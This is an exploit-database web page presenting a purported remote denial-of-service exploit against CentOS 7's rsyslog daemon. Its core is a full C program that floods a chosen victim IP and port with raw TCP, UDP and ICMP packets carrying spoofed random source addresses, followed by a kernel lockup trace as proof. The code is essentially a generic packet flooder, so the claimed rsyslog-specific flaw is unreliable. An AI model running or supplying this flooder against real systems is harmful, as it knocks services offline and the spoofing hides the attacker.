	
<!DOCTYPE html>
<HTML lang="en">
<HEAD>
<META http-equiv="Content-Type" content="text/html; charset=utf-8">
<TITLE>CentOS7 kernel crashing by rsyslog daemon vulnerability DoS - CXSecurity.com</TITLE>
<META http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<META name="keywords" content="CentOS7, kernel, crashing, by, rsyslog, daemon, vulnerability, DoS, exploit, vulnerability, bug, issue, advisories">
<META name="description" content="Hosein Askari  has realised a new security note CentOS7 kernel crashing by rsyslog daemon vulnerability DoS ">
<META name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<META name="mobile-web-app-capable" content="yes">
<link rel="manifest" href="/manifest.json?b">
<LINK rel="Icon" href="https://cert.cx/cxstatic/favicon.ico" type="image/x-icon">
<script type="text/javascript" src="https://cert.cx/cxstatic/js/m-jq.js?T"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
<script type="text/javascript" src="https://cert.cx/cxstatic/js/m.js?V"></script>
<link href="https://cert.cx/cxstatic/css/b.css?G" rel="stylesheet" type='text/css'/>
</HEAD>
<script type="text/javascript">
var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-39628967-1']);
_gaq.push(['_trackPageview']);
(function() {
var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})();
</script><BODY ng-app="ui.bootstrap.demo">
<div class="navbar navbar-default navbar-fixed-top" id="frezz">
<div class="container"><div class="navbar-header"><a class="navbar-brand" href="https://cxsecurity.com/"><IMG SRC="https://cert.cx/cxstatic/images/12018/cxseci.png" width="150" height="20" ALT="Home Page"></a><button class="navbar-toggle" type="button" data-toggle="collapse" data-target="#navbar-main"><span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span></button></div><div class="navbar-collapse collapse" id="navbar-main" ><ul class="nav navbar-nav">
          <li><a href="https://cxsecurity.com/">Home</a></li><li class="active">
<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">Bugtraq<span class="caret"></span></a>
<ul class="dropdown-menu" role="menu">
<li><a href="https://cxsecurity.com/wlb/">Full List</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/bugs/">Only Bugs</a></li>
<li><a href="https://cxsecurity.com/tricks/">Only Tricks</a></li>
<li><a href="https://cxsecurity.com/exploit/">Only Exploits</a></li>
<li><a href="https://cxsecurity.com/dorks/">Only Dorks</a></li>
<li><a href="https://cxsecurity.com/cvelist/">Only CVE</a></li>
<li><a href="https://cxsecurity.com/cwelist/">Only CWE</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/bogus/">Fake Notes</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/best/1/">Ranking</a></li>

</ul></li>
<li class="dropdown">
<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">CVEMAP<span class="caret"></span></a>
<ul class="dropdown-menu" role="menu">
<li><a href="https://cxsecurity.com/cvemap/">Full List</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/cvevendors/">Show Vendors</a></li>
<li><a href="https://cxsecurity.com/cveproducts/">Show Products</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/allcwe/">CWE Dictionary</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/cve/">Check CVE Id </a></li>
<li><a href="https://cxsecurity.com/cwe/">Check CWE Id</a></li>
</ul></li>
<li class="dropdown">
<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">Search<span class="caret"></span></a>
<ul class="dropdown-menu" role="menu">
<li><a href="https://cxsecurity.com/search/">Bugtraq</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/search/cve/">CVEMAP</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/search/author/">By author</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/cve/">CVE Id</a></li>
<li><a href="https://cxsecurity.com/cwe/">CWE Id</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/cvevendors/">By vendors</a></li>
<li><a href="https://cxsecurity.com/cveproducts/">By products</a></li>
</ul></li>
<li class="dropdown">
<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">RSS<span class="caret"></span></a>
<ul class="dropdown-menu" role="menu">
<li><a href="https://cxsecurity.com/wlb/rss/all/">Bugtraq</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/cverss/fullmap/">CVEMAP</a></li>
<li><a href="https://cxsecurity.com/cveproducts/">CVE Products</a></li>
    <li class="divider"></li>
<li><a href="https://cxsecurity.com/wlb/rss/vulnerabilities/">Bugs</a></li>
<li><a href="https://cxsecurity.com/wlb/rss/exploit/">Exploits</a></li>
<li><a href="https://cxsecurity.com/wlb/rss/dorks/">Dorks</a></li>
</ul></li>
<li class="dropdown">
<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">More<span class="caret"></span></a>
<ul class="dropdown-menu" role="menu">
<li><a href="http://cifrex.org/">cIFrex</a></li>
<li class="divider"></li>
<li><a href="https://www.facebook.com/cxsec">Facebook</a></li>
<li><a href="https://twitter.com/cxsecurity">Twitter</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/donate/">Donate</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/wlb/about/">About</a></li>
</ul></li>
</ul>
<ul class="nav navbar-nav navbar-right">
<li><a href="https://cxsecurity.com/wlb/add/">Submit</a></li>
</ul></div></div></div>
<div id="general"><TABLE width="100%"><TR><TD width="6%"></TD><TD id="boki"></TD><TD id='glowna'><CENTER>
<script src="https://www.google.com/recaptcha/api.js?onload=CaptchaCallback&render=explicit" async defer></script>
<script type="text/javascript">
        var CaptchaCallback = function() {
            var recap1 = grecaptcha.render('Recaptcha1', {'sitekey' : '6LfbQCQTAAAAANKENerevt305dDl_nywcNEn91q6', 'theme' : 'dark', 'callback' : 'setComIt'});
            var recap2 = grecaptcha.render('Recaptcha2', {'sitekey' : '6LfbQCQTAAAAANKENerevt305dDl_nywcNEn91q6', 'theme' : 'dark', 'callback' : 'onSubmit'});
        };
    </script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/angular-sanitize/1.6.6/angular-sanitize.min.js"></script>
<script type="text/javascript" src="https://cxsecurity.com/js/show.js"></script>
<TABLE cellpadding="0" cellspacing="0" width="100%"><TR><TD>
<DIV ng-non-bindable><CENTER><h4><B>CentOS7 kernel crashing by rsyslog daemon vulnerability DoS</B></h4>
<div class="panel panel-default""><div class="panel-body"><div class="container"><div class="row">
<div class="col-xs-12 col-md-3"><div class="well well-sm"><b>2017.02.12</b></div></div>
<div class="col-xs-12 col-md-6"><div class="well well-sm"><U>Credit:</U> <b> <A HREF="https://cxsecurity.com/author/Hosein+Askari+/1/">Hosein Askari </a>  </b>
</div></div><div class="col-xs-5 col-md-3"><div class="well well-sm">
  <U>Risk:</U> <b>
<span class="label label-warning">Medium</span></b>
</div></div><div class="col-xs-3 col-md-3"><div class="well well-sm">
  <U>Local:</U> <b>No</b>
</div></div><div class="col-xs-4 col-md-3"><div class="well well-sm">
  <U>Remote:</U> <b><B>Yes</B></span></b>
</div></div><div class="col-xs-6 col-md-3"><div class="well well-sm">
  <U>CVE:</U> <b>N/A</b>
</div></div><div class="col-xs-6 col-md-3"><div class="well well-sm">
  <U>CWE:</U> <b>N/A</b></div></div></div><P><TABLE width="70%"><TR><TD><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-5074670963595353"
     data-ad-slot="9692700437"
     data-full-width-responsive="true"
     data-ad-format="auto"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></TD></TR>
</TABLE><P></CENTER></div></div></div><P><DIV style="white-space: pre-wrap; word-break: break-all;" ng-non-bindable><div class="well well-sm premex">#####
#Exploit Title: CentOS7 Kernel Crashing by rsyslog daemon vulnerability | DOS on CentOS7
#Exploit Author: Hosein Askari (FarazPajohan)
#Vendor HomePage: https://www.centos.org/
#Version : 7
#Tested on: Parrot OS
#Date: 12-2-2017
#Category: Operating System
#Vulnerable Daemon: RSYSLOG
#Author Mail :hosein.askari@aol.com
#Description:
#The CentOS7&#039;s kernel is disrupted by vulnerability on rsyslog daemon, in which the cpu usage will be 100% until the remote exploit launches on the victim&#039;s #server.
****************************
#Exploit Command :
# ~~~#exploit.out -T3 -h &lt;victim_ip&gt; -p [514,514]  // You can run this exploit on both &quot;514 TCP/UDP&quot;
#
#Exploit Code :
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netdb.h&gt;
#include &lt;sys/types.h&gt;
#ifdef F_PASS
#include &lt;sys/stat.h&gt;
#endif
#include &lt;netinet/in_systm.h&gt;                                                  
#include &lt;sys/socket.h&gt;
#include &lt;string.h&gt;
#include &lt;time.h&gt;
#ifndef __USE_BSD
#   define __USE_BSD
#endif
#ifndef __FAVOR_BSD
#   define __FAVOR_BSD
#endif
#include &lt;netinet/in.h&gt;
#include &lt;netinet/ip.h&gt;
#include &lt;netinet/tcp.h&gt;
#include &lt;netinet/udp.h&gt;
#include &lt;netinet/ip_icmp.h&gt;
#include &lt;arpa/inet.h&gt;
#ifdef LINUX
#   define FIX(x)  htons(x)
#else
#   define FIX(x)  (x)
#endif
#define TCP_ACK         1
#define TCP_FIN         2
#define TCP_SYN         4
#define TCP_RST         8
#define UDP_CFF        16
#define ICMP_ECHO_G    32
#define TCP_NOF        64
#define TCP_URG        128
#define TH_NOF         0x0
#define TCP_ATTACK()    (a_flags &amp; TCP_ACK ||\
                         a_flags &amp; TCP_FIN ||\
                         a_flags &amp; TCP_SYN ||\
                         a_flags &amp; TCP_RST ||\
                         a_flags &amp; TCP_NOF ||\
                         a_flags &amp; TCP_URG )
#define UDP_ATTACK()    (a_flags &amp; UDP_CFF)
#define ICMP_ATTACK()   (a_flags &amp; ICMP_ECHO_G)
#define CHOOSE_DST_PORT() dst_sp == 0 ?\
                          random ()   :\
                          htons(dst_sp + (random() % (dst_ep -dst_sp +1)));
#define CHOOSE_SRC_PORT() src_sp == 0 ?\
                          random ()   :\
                          htons(src_sp + (random() % (src_ep -src_sp +1)));
#define SEND_PACKET()   if (sendto(rawsock,\
                                   &amp;packet,\
                                   (sizeof packet),\
                                   0,\
                                   (struct sockaddr *)&amp;target,\
                                    sizeof target) &lt; 0) {\
                                        perror(&quot;sendto&quot;);\
                                        exit(-1);\
                        }
#define BANNER_CKSUM 54018
u_long lookup(const char *host);
unsigned short in_cksum(unsigned short *addr, int len);                        
static void inject_iphdr(struct ip *ip, u_char p, u_char len);
char *class2ip(const char *class);
static void send_tcp(u_char th_flags);
static void send_udp(u_char garbage);
static void send_icmp(u_char garbage);
char *get_plain(const char *crypt_file, const char *xor_data_key);
static void usage(const char *argv0);
u_long dstaddr;
u_short dst_sp, dst_ep, src_sp, src_ep;
char *src_class, *dst_class;
int a_flags, rawsock;
struct sockaddr_in target;
const char *banner = &quot;Written By C0NSTANTINE&quot;;
struct pseudo_hdr {         
    u_long saddr, daddr;    
    u_char mbz, ptcl;       
    u_short tcpl;           
};
struct cksum {
    struct pseudo_hdr pseudo;
    struct tcphdr tcp;
};
struct {
    int gv; 
    int kv; 
    void (*f)(u_char);
} a_list[] = {
    { TCP_ACK, TH_ACK, send_tcp },
    { TCP_FIN, TH_FIN, send_tcp },
    { TCP_SYN, TH_SYN, send_tcp },
    { TCP_RST, TH_RST, send_tcp },
    { TCP_NOF, TH_NOF, send_tcp },
    { TCP_URG, TH_URG, send_tcp },
    { UDP_CFF, 0, send_udp },
    { ICMP_ECHO_G, ICMP_ECHO, send_icmp },
    { 0, 0, (void *)NULL },
};
int
main(int argc, char *argv[])
{
    int n, i, on = 1;
    int b_link;
#ifdef F_PASS
    struct stat sb;
#endif
    unsigned int until;
    a_flags = dstaddr = i = 0;
    dst_sp = dst_ep = src_sp = src_ep = 0;
    until = b_link = -1;
    src_class = dst_class = NULL;
    while ( (n = getopt(argc, argv, &quot;T:UINs:h:d:p:q:l:t:&quot;)) != -1) {
        char *p;
        switch (n) {
            case &#039;T&#039;:
                switch (atoi(optarg)) {
                    case 0: a_flags |= TCP_ACK; break;
                    case 1: a_flags |= TCP_FIN; break;
                    case 2: a_flags |= TCP_RST; break;
                    case 3: a_flags |= TCP_SYN; break;

                    case 4: a_flags |= TCP_URG; break;


                }
                break;
            case &#039;U&#039;:
                a_flags |= UDP_CFF;
                break;
            case &#039;I&#039;: 
                a_flags |= ICMP_ECHO_G;
                break;
            case &#039;N&#039;: 
                a_flags |= TCP_NOF;
                break;
            case &#039;s&#039;:
                src_class = optarg;
                break;
            case &#039;h&#039;:
                dstaddr = lookup(optarg);    
                break;
            case &#039;d&#039;:
                dst_class = optarg;
                i = 1; 
                break;
            case &#039;p&#039;:
                if ( (p = (char *) strchr(optarg, &#039;,&#039;)) == NULL)
                    usage(argv[0]);
                dst_sp = atoi(optarg); 
                dst_ep = atoi(p +1);  
                break;
            case &#039;q&#039;:
                if ( (p = (char *) strchr(optarg, &#039;,&#039;)) == NULL)
                    usage(argv[0]);
                src_sp = atoi(optarg); 
                src_ep = atoi(p +1); 
                break;
            case &#039;l&#039;:
                b_link = atoi(optarg);
                if (b_link &lt;= 0 || b_link &gt; 100)
                    usage(argv[0]);
                break;
            case &#039;t&#039;:
                until = time(0) +atoi(optarg);
                break;
            default:
                usage(argv[0]);
                break;
        }
    }
    if ( (!dstaddr &amp;&amp; !i) ||
         (dstaddr &amp;&amp; i) ||
         (!TCP_ATTACK() &amp;&amp; !UDP_ATTACK() &amp;&amp; !ICMP_ATTACK()) ||
         (src_sp != 0 &amp;&amp; src_sp &gt; src_ep) ||
         (dst_sp != 0 &amp;&amp; dst_sp &gt; dst_ep))
            usage(argv[0]);
    srandom(time(NULL) ^ getpid());
    if ( (rawsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; 0) {
        perror(&quot;socket&quot;);
        exit(-1);
    }
    if (setsockopt(rawsock, IPPROTO_IP, IP_HDRINCL,
        (char *)&amp;on, sizeof(on)) &lt; 0) {
            perror(&quot;setsockopt&quot;);
            exit(-1);
    }
    target.sin_family           = AF_INET;
    for (n = 0; ; ) {
        if (b_link != -1 &amp;&amp; random() % 100 +1 &gt; b_link) {
            if (random() % 200 +1 &gt; 199)
                usleep(1);
            continue;
        }
        for (i = 0; a_list[i].f != NULL; ++i) {
            if (a_list[i].gv &amp; a_flags)
                a_list[i].f(a_list[i].kv);
        }        
        if (n++ == 100) {
            if (until != -1 &amp;&amp; time(0) &gt;= until) break;
            n = 0;
        }
    }          
    exit(0);
}
u_long
lookup(const char *host)
{
    struct hostent *hp;
  
    if ( (hp = gethostbyname(host)) == NULL) {
        perror(&quot;gethostbyname&quot;);
        exit(-1);
    }
    return *(u_long *)hp-&gt;h_addr;
}
#define RANDOM() (int) random() % 255 +1
char *
class2ip(const char *class)
{
    static char ip[16];
    int i, j;
  
    for (i = 0, j = 0; class[i] != &#039;{TEXTO}&#039;; ++i)
        if (class[i] == &#039;.&#039;)
            ++j;
    switch (j) {
        case 0:
            sprintf(ip, &quot;%s.%d.%d.%d&quot;, class, RANDOM(), RANDOM(), RANDOM());
            break;
        case 1:
            sprintf(ip, &quot;%s.%d.%d&quot;, class, RANDOM(), RANDOM());
            break;
        case 2:
            sprintf(ip, &quot;%s.%d&quot;, class, RANDOM());
            break;
        default: strncpy(ip, class, 16);
                 break;
    }
    return ip;
}
unsigned short
in_cksum(unsigned short *addr, int len)
{
    int nleft = len;
    int sum = 0;
    unsigned short *w = addr;
    unsigned short answer = 0;
    while (nleft &gt; 1) {
        sum += *w++;
        nleft -= 2;
    }
    if (nleft == 1) {
        *(unsigned char *) (&amp;answer) = *(unsigned char *)w;
        sum += answer;
    }
    sum    = (sum &gt;&gt; 16) + (sum &amp; 0xffff);  
    sum   += (sum &gt;&gt; 16);                   
    answer = ~sum;                         
    return answer;
}
static void
inject_iphdr(struct ip *ip, u_char p, u_char len)
{
    ip-&gt;ip_hl             = 5;
    ip-&gt;ip_v              = 4;
    ip-&gt;ip_p              = p;
    ip-&gt;ip_tos            = 0x08; /* 0x08 */
    ip-&gt;ip_id             = random();
    ip-&gt;ip_len            = len;
    ip-&gt;ip_off            = 0;
    ip-&gt;ip_ttl            = 255;
    ip-&gt;ip_dst.s_addr     = dst_class != NULL ?
                            inet_addr(class2ip(dst_class)) :
                            dstaddr; 
    ip-&gt;ip_src.s_addr     = src_class != NULL ?
                            inet_addr(class2ip(src_class)) :
                            random();
    target.sin_addr.s_addr = ip-&gt;ip_dst.s_addr;
}    
static void
send_tcp(u_char th_flags)
{
    struct cksum cksum;
    struct packet {
       struct ip ip;
        struct tcphdr tcp;
    } packet;
    memset(&amp;packet, 0, sizeof packet);
    inject_iphdr(&amp;packet.ip, IPPROTO_TCP, FIX(sizeof packet));
    packet.ip.ip_sum        = in_cksum((void *)&amp;packet.ip, 20);
    cksum.pseudo.daddr      = dstaddr;
    cksum.pseudo.mbz        = 0;
    cksum.pseudo.ptcl       = IPPROTO_TCP;
    cksum.pseudo.tcpl       = htons(sizeof(struct tcphdr));
    cksum.pseudo.saddr      = packet.ip.ip_src.s_addr;
    packet.tcp.th_flags     = random();
    packet.tcp.th_win       = random();
    packet.tcp.th_seq       = random();
    packet.tcp.th_ack       = random();
    packet.tcp.th_off       = 5;
    packet.tcp.th_urp       = 0;
    packet.tcp.th_sport     = CHOOSE_SRC_PORT();
    packet.tcp.th_dport     = CHOOSE_DST_PORT();
    cksum.tcp               = packet.tcp;
    packet.tcp.th_sum       = in_cksum((void *)&amp;cksum, sizeof(cksum));
    SEND_PACKET();
}
static void
send_udp(u_char garbage) 
{                      
    struct packet {
        struct ip ip;
        struct udphdr udp;
    } packet;
    memset(&amp;packet, 0, sizeof packet);
    inject_iphdr(&amp;packet.ip, IPPROTO_UDP, FIX(sizeof packet));
    packet.ip.ip_sum            = in_cksum((void *)&amp;packet.ip, 20);
    packet.udp.uh_sport         = CHOOSE_SRC_PORT();
    packet.udp.uh_dport         = CHOOSE_DST_PORT();
    packet.udp.uh_ulen          = htons(sizeof packet.udp);
    packet.udp.uh_sum           = 0; 
    SEND_PACKET();
}
static void
send_icmp(u_char gargabe) 
{
    struct packet {
        struct ip ip;
        struct icmp icmp;
    } packet;
    memset(&amp;packet, 0, sizeof packet);
    inject_iphdr(&amp;packet.ip, IPPROTO_ICMP, FIX(sizeof packet));
    packet.ip.ip_sum            = in_cksum((void *)&amp;packet.ip, 20);
    packet.icmp.icmp_type       = ICMP_ECHO;
    packet.icmp.icmp_code       = 0;
    packet.icmp.icmp_cksum      = htons( ~(ICMP_ECHO &lt;&lt; 8));
    for(int pp=0;pp&lt;=1000;pp++)
    {SEND_PACKET();
    pp++;
    }
} 
static void
usage(const char *argv0)
{
    printf(&quot;%s \n&quot;, banner);
        printf(&quot;    -U UDP   attack                         \e[1;37m(\e[0m\e[0;31mno options\e[0m\e[1;37m)\e[0m\n&quot;);
        printf(&quot;    -I ICMP  attack                         \e[1;37m(\e[0m\e[0;31mno options\e[0m\e[1;37m)\e[0m\n&quot;);
        printf(&quot;    -N Bogus attack                         \e[1;37m(\e[0m\e[0;31mno options\e[0m\e[1;37m)\e[0m\n&quot;);
        printf(&quot;    -T TCP   attack     \e[1;37m[\e[0m0:ACK, 1:FIN, 2:RST, 3:SYN, 4:URG\e[1;37m]\e[0m\n&quot;);
        printf(&quot;    -h destination host/ip                  \e[1;37m(\e[0m\e[0;31mno default\e[0m\e[1;37m)\e[0m\n&quot;);
        printf(&quot;    -d destination class                        \e[1;37m(\e[0m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n&quot;);
        printf(&quot;    -s source class/ip                          \e[1;37m(\e[m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n&quot;);
        printf(&quot;    -p destination port range [start,end]       \e[1;37m(\e[0m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n&quot;);
        printf(&quot;    -q source port range      [start,end]       \e[1;37m(\e[0m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n&quot;);
        printf(&quot;    -l pps limiter                            \e[1;37m(\e[0m\e[0;31mno limit\e[0m\e[1;37m)\e[0m\n&quot;);
        printf(&quot;    -t timeout                              \e[1;37m(\e[0m\e[0;31mno default\e[0m\e[1;37m)\e[0m\n&quot;);
    printf(&quot;\e[1musage\e[0m: %s [-T0 -T1 -T2 -T3 -T4 -U -I -h -p -t]\n&quot;, argv0);
    exit(-1);
}

********************************
#Description :
#The Sample Output of &quot;dmesg&quot; is shown below :

[ 2613.161800] task: ffff88016f5cb980 ti: ffff88016f5e8000 task.ti: ffff88016f5e8000
[ 2613.161801] RIP: 0010:[&lt;ffffffffa016963a&gt;]  [&lt;ffffffffa016963a&gt;] e1000_xmit_frame+0xaca/0x10b0 [e1000]
[ 2613.161808] RSP: 0018:ffff880172203530  EFLAGS: 00000286
[ 2613.161809] RAX: ffffc90008fc3818 RBX: ffffffff00000000 RCX: ffff88016d220000
[ 2613.161810] RDX: 0000000000000047 RSI: 00000000ffffffff RDI: ffff88016d220000
[ 2613.161810] RBP: ffff8801722035b0 R08: 0000000000000000 R09: 0000000002000000
[ 2613.161811] R10: 0000000000000000 R11: 0000000000000000 R12: ffff8801722034a8
[ 2613.161812] R13: ffffffff8164655d R14: ffff8801722035b0 R15: 0000000000000000
[ 2613.161813] FS:  0000000000000000(0000) GS:ffff880172200000(0000) knlGS:0000000000000000
[ 2613.161813] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 2613.161814] CR2: 00007ff8367b1000 CR3: 000000016d143000 CR4: 00000000001407f0
[ 2613.161886] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[ 2613.161912] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400
[ 2613.161913] Stack:
[ 2613.161913]  ffffffff81517cf7 ffff88016eab5098 000000468151a494 0000000800000000
[ 2613.161915]  000000006d738000 ffff880100000000 0000000100001000 ffff88014e09d100
[ 2613.161916]  ffff8800358aeac0 ffff88016d220000 ffff88016eab5000 ffff88016d220000
[ 2613.161918] Call Trace:
[ 2613.161919]  &lt;IRQ&gt; 
[ 2613.161923]  [&lt;ffffffff81517cf7&gt;] ? kfree_skbmem+0x37/0x90
[ 2613.161926]  [&lt;ffffffff8152c671&gt;] dev_hard_start_xmit+0x171/0x3b0
[ 2613.161929]  [&lt;ffffffff8154cd74&gt;] sch_direct_xmit+0x104/0x200
[ 2613.161931]  [&lt;ffffffff8152cae6&gt;] dev_queue_xmit+0x236/0x570
[ 2613.161933]  [&lt;ffffffff8156ae1d&gt;] ip_finish_output+0x53d/0x7d0
[ 2613.161934]  [&lt;ffffffff8156bdcf&gt;] ip_output+0x6f/0xe0
[ 2613.161936]  [&lt;ffffffff8156a8e0&gt;] ? ip_fragment+0x8b0/0x8b0
[ 2613.161937]  [&lt;ffffffff81569a41&gt;] ip_local_out_sk+0x31/0x40
[ 2613.161938]  [&lt;ffffffff8156c816&gt;] ip_send_skb+0x16/0x50
[ 2613.161940]  [&lt;ffffffff8156c883&gt;] ip_push_pending_frames+0x33/0x40
[ 2613.161942]  [&lt;ffffffff8159a79e&gt;] icmp_push_reply+0xee/0x120
[ 2613.161943]  [&lt;ffffffff8159ad18&gt;] icmp_send+0x448/0x800
[ 2613.161945]  [&lt;ffffffff8156c816&gt;] ? ip_send_skb+0x16/0x50
[ 2613.161946]  [&lt;ffffffff8159a79e&gt;] ? icmp_push_reply+0xee/0x120
[ 2613.161949]  [&lt;ffffffff8163cb5b&gt;] ? _raw_spin_unlock_bh+0x1b/0x40
[ 2613.161950]  [&lt;ffffffff8159aafc&gt;] ? icmp_send+0x22c/0x800
[ 2613.161952]  [&lt;ffffffffa05cf421&gt;] reject_tg+0x3c1/0x4f8 [ipt_REJECT]
[ 2613.161966]  [&lt;ffffffff81170002&gt;] ? split_free_page+0x22/0x200
[ 2613.161971]  [&lt;ffffffffa00920e0&gt;] ipt_do_table+0x2e0/0x701 [ip_tables]
[ 2613.161973]  [&lt;ffffffff81518e95&gt;] ? skb_checksum+0x35/0x50
[ 2613.161975]  [&lt;ffffffff81518ef0&gt;] ? skb_push+0x40/0x40
[ 2613.161976]  [&lt;ffffffff81517a70&gt;] ? reqsk_fastopen_remove+0x140/0x140
[ 2613.161978]  [&lt;ffffffff81520061&gt;] ? __skb_checksum_complete+0x21/0xd0
[ 2613.161981]  [&lt;ffffffffa03e2036&gt;] iptable_filter_hook+0x36/0x80 [iptable_filter]
[ 2613.161984]  [&lt;ffffffff8155c750&gt;] nf_iterate+0x70/0xb0
[ 2613.161985]  [&lt;ffffffff8155c838&gt;] nf_hook_slow+0xa8/0x110
[ 2613.161987]  [&lt;ffffffff81565f92&gt;] ip_local_deliver+0xb2/0xd0
[ 2613.161988]  [&lt;ffffffff81565ba0&gt;] ? ip_rcv_finish+0x350/0x350
[ 2613.161989]  [&lt;ffffffff815658cd&gt;] ip_rcv_finish+0x7d/0x350
[ 2613.161990]  [&lt;ffffffff81566266&gt;] ip_rcv+0x2b6/0x410
[ 2613.161992]  [&lt;ffffffff81565850&gt;] ? inet_del_offload+0x40/0x40
[ 2613.161993]  [&lt;ffffffff8152a882&gt;] __netif_receive_skb_core+0x582/0x7d0
[ 2613.161995]  [&lt;ffffffff8152aae8&gt;] __netif_receive_skb+0x18/0x60
[ 2613.161996]  [&lt;ffffffff8152ab70&gt;] netif_receive_skb+0x40/0xc0
[ 2613.161997]  [&lt;ffffffff8152b6e0&gt;] napi_gro_receive+0x80/0xb0
[ 2613.162001]  [&lt;ffffffffa016803d&gt;] e1000_clean_rx_irq+0x2ad/0x580 [e1000]
[ 2613.162005]  [&lt;ffffffffa016aa75&gt;] e1000_clean+0x265/0x8e0 [e1000]
[ 2613.162007]  [&lt;ffffffff8152afa2&gt;] net_rx_action+0x152/0x240
[ 2613.162009]  [&lt;ffffffff81084b0f&gt;] __do_softirq+0xef/0x280
[ 2613.162011]  [&lt;ffffffff8164721c&gt;] call_softirq+0x1c/0x30
[ 2613.162012]  &lt;EOI&gt; 
[ 2613.162015]  [&lt;ffffffff81016fc5&gt;] do_softirq+0x65/0xa0
[ 2613.162016]  [&lt;ffffffff81084404&gt;] local_bh_enable+0x94/0xa0
[ 2613.162019]  [&lt;ffffffff81123f52&gt;] rcu_nocb_kthread+0x232/0x370
[ 2613.162021]  [&lt;ffffffff810a6ae0&gt;] ? wake_up_atomic_t+0x30/0x30
[ 2613.162022]  [&lt;ffffffff81123d20&gt;] ? rcu_start_gp+0x40/0x40
[ 2613.162024]  [&lt;ffffffff810a5aef&gt;] kthread+0xcf/0xe0
[ 2613.162026]  [&lt;ffffffff810a5a20&gt;] ? kthread_create_on_node+0x140/0x140
[ 2613.162028]  [&lt;ffffffff81645858&gt;] ret_from_fork+0x58/0x90
[ 2613.162029]  [&lt;ffffffff810a5a20&gt;] ? kthread_create_on_node+0x140/0x140
[ 2613.162030] Code: 14 48 8b 45 c8 48 8b 80 00 03 00 00 f6 80 98 00 00 00 03 74 16 48 8b 4d c8 41 0f b7 47 2a 41 8b 57 18 48 03 81 90 0c 00 00 89 10 &lt;48&gt; 83 c4 58 31 c0 5b 41 5c 41 5d 41 5e 41 5f 5d c3 0f 1f 44 00 
[ 2641.184338] BUG: soft lockup - CPU#0 stuck for 22s! [rcuos/0:138]
#############################
</DIV></P><P class="txt" id="refer"></P></DIV><div class="panel panel-default"">
 <div class="panel-body"><CENTER>
<TABLE width="75%"><TR><TD><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-5074670963595353"
     data-ad-slot="6599633238"
     data-full-width-responsive="true"
     data-ad-format="auto"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></TD></TR></TABLE><BR>
<div class="container"><div class="row">
<div class="col-xs-12 col-md-6"><div class="well well-sm">
<CENTER><A HREF="https://cxsecurity.com/ascii/WLB-2017020112"><FONT SIZE="4"><b>See this note in RAW Version</b></FONT></A></CENTER></div></div>
<div class="col-xs-6 col-md-3"><div class="well well-sm">
<a href="https://twitter.com/share" class="twitter-share-button" data-count="none">Tweet</a>
<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script></div></div>
<div class="col-xs-6 col-md-3"><div class="well well-sm">
<div id="fb-root"></div>
<script>(function(d, s, id) {
var js, fjs = d.getElementsByTagName(s)[0];
if (d.getElementById(id)) return;
js = d.createElement(s); js.id = id;
js.src = "//connect.facebook.net/pl_PL/sdk.js#xfbml=1&version=v2.3";
fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<div class="fb-like" data-href="https://cxsecurity.com/issue/WLB-2017020112" data-width="50" data-layout="button" data-action="like" data-show-faces="false" data-share="false"></div></div></div>
<div class="col-xs-12 col-md-12"><div class="well well-sm">
<div class="container">
<div class="group-form inline">
<div class="col-sm-12 col-md-6" valign="middle">
Vote for this issue:
<input type="hidden" id="numberWlb" value="2017020112">
